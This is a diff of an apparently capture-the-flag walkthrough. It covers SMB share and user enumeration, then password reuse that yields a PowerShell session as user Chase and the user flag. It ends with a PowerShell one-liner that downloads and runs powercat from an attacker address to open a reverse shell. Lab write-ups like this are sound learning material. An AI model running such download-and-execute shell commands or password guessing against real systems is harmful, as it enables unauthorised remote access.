@@ -50,6 +50,23 @@ I user smbmap to try to list for any smb shares available in the box:
 
 <img width="721" alt="10" src="https://user-images.githubusercontent.com/47299364/69317869-2cf44b00-0c3c-11ea-9449-480b2091d9f6.png">
 
+Unfortunately all the shares have "No Access" permissions. I can't list any files from there.
+
+Let's try to use another tool, lookupsid.py to try to get users available in the system:
+
+<img width="538" alt="11" src="https://user-images.githubusercontent.com/47299364/69318001-7cd31200-0c3c-11ea-912e-76aaf8532c62.png">
+
+Nice, we got something. A couple new users are visible.
+
+Then it was a game of trying the passwords i have from a couple steps above into the users available, until they worked with user Chase. The tool seen below it's a ruby script that will establish a powershell connection to the system:
+
+<img width="1006" alt="12" src="https://user-images.githubusercontent.com/47299364/69318163-dcc9b880-0c3c-11ea-91e1-abe29a733fb8.png">
+
+And i got user flag:
+<img width="517" alt="13" src="https://user-images.githubusercontent.com/47299364/69318186-e3583000-0c3c-11ea-8528-26db202ac605.png">
+
+
+
 powershell to download the script and execute it to get reverse shell:
 
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.157/powercat/powercat.ps1');powercat -c 10.10.14.157 -p 9091 -e cmd"
